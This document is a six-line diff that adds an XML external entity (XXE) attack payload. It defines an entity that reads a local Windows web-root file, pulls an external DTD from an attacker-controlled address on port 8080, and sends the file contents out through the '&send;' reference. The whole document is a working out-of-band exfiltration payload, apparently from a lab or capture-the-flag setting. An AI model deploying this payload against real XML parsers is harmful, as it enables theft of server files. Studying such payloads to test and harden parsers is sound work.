@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE HYP3RLINX  [
+<!ENTITY % file SYSTEM "c:\inetpub\wwwroot\http.ps1">
+<!ENTITY % dtd SYSTEM "http://10.10.14.4:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
